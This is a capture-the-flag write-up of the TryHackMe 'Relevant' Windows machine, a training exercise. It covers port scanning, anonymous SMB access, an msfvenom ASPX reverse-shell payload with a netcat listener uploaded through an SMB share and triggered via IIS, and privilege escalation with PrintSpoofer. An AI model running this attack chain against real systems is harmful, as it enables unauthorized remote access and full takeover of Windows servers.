---
title: Relevant Tryhackme Writeup
published: true
---

Today I bring you the writeup of [Relevant](https://tryhackme.com/room/relevant), a tryhackme machine focused on windows exploitation, here we go!

First we start with a port scan to see which ports are open.

```shell
nmap -p- --min-rate 5000 IP -Pn
```

With -p- we indicate that we want it to look at all ports, -Pn is not to make ping requests since it is a windows and blocks them and the --min-rate 5000 to do it very fast.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/1.png)

Now that we know the ports, let's scan them deeply to see versions and so on.

```shell
nmap -sC -sV -p80,135,139,445,3389,49663,49667,49669 --min-rate 5000 IP -Pn
```

With -sC we indicate that we want to run the default nmap scripts and -sV to get the service versions.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/2.png)

Let's enumerate the smb to see if it has any folders accessible to us.

```shell
smbclient -L IP -N
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/3.png)

We see a directory called nt4wrksv that we can access, let's see what is inside.

```shell
smbclient //IP/nt4wrksv -N
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/4.png)

We see a txt file that if we get it with get passwords.txt and read it, we see that it is in base64, when we decrypt it we see that they are two users and two passwords, after several tests I did not find anything to do with them so we will ignore them for now at least.

Let's try to see if from any of the http, we can access the passwords.txt and thus try to do a reverse through the web by uploading a file to the smb.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/5.png)

Indeed, we can; I found this [blog](https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/) where he teaches us how to exploit a microsoft server with metasploit, let's do it.

```shell
nc -lvp PORT
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/6.png)

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o rev.aspx
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/7.png)

Now let's upload the file.

```shell
smbclient //IP/nt4wrksv -N
put rev.aspx
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/8.png)

We have to go to the web and put in the url the file we just uploaded.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/9.png)

And after waiting a while we are in! now, to climb.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/10.png)

Let's see the permissions of the user we have with ```whoami /priv```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/11.png)

We see that it has the "SetImpersonatePrivilege" permission enabled, googling we see [this](https://github.com/dievus/printspoofer) to be able to escalate privileges thanks to this.

Let's download the exe from the github I found earlier and upload it via smb.

```shell
git clone https://github.com/dievus/printspoofer.git
cd printspoofer
smbclient //10.10.142.94/nt4wrksv -N
put PrintSpoofer.exe
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/12.png)

On the windows machine we have to go to where the SMB uploads are stored and run the exe.

```shell
cd C:\inetpub\wwwroot\nt4wrksv
PrintSpoofer.exe -i -c cmd
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Relevant_writeup/13.png)

And that's it! rooted machine.
